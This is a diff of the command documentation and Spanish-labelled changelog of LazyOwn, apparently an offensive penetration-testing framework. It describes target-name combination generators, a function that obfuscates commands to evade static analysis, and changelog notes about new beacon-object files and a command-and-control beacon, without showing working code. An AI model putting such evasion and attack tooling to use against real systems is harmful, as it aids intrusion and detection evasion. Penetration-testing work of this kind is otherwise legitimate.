+Enable or disable the IA assitant (use DeepSeek in local).
+
 ## wrapper
 No description available.
 
 ## wrapper_yaml
+No description available.
+
+## cmd_wrapper
+No description available.
+
+## show_toastr
 No description available.
 
 ## find_tgts
@@ -11473,7 +11764,7 @@ Generates sixth character combinations with the target name, adding uppercase ch
 ## intercalate_combo
 Generates combinations of the target name and character list, intercalating uppercase and lowercase characters.
 
-This function generates combinations where each character in the string alternates between uppercase and 
+This function generates combinations where each character in the string alternates between uppercase and
 lowercase. It also allows for the addition of the target name at the beginning or the end of the string.
 
 :param name: Target name to use in the combinations.
@@ -11542,7 +11833,7 @@ Raises:
 Generate a list of obfuscated commands based on the given input command.
 
 This function creates various obfuscated versions of the provided command string.
-Each obfuscation method applies a different technique to disguise the command, 
+Each obfuscation method applies a different technique to disguise the command,
 making it less recognizable to simple static analysis.
 
 Args:
@@ -11568,11 +11859,49 @@ No description available.
 ## resolve_and_download_dependencies
 Recursively resolve and download package dependencies with enhanced checks
 
+## tool_wrapper
+No description available.
+
 <!-- END COMMANDS -->
 
 <!-- START CHANGELOG -->
 
 # Changelog
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(feat): new commands, new bofs, newbug fixing, etc \n\n Version: release/0.2.64 \n\n with love \n\n Modified file(s):\n- README.md - UTILS.md - docs/README.html - docs/UTILS.html\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Oct 3 03:24:41 2025 -0300 \n\n Hora: 1759472681
+
+
+### Otros
+
+### Otros
+
+  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn
+
+
+### Otros
+
+### Otros
+
+  *   * more love to new beacon in https://github.com/grisuno/beacon, new commands LazyAddons, some bug fixing, now you can pass more than one commands in lazycommnds of lazyaddons comma separated
+
+
+### Otros
+
+### Otros
+
+  *   * Merge pull request #119 from grisuno/grisuno-patch-1
+
+
+### Otros
+
+### Otros
+
+  *   * Update README.md
 
 
 ### Nuevas características
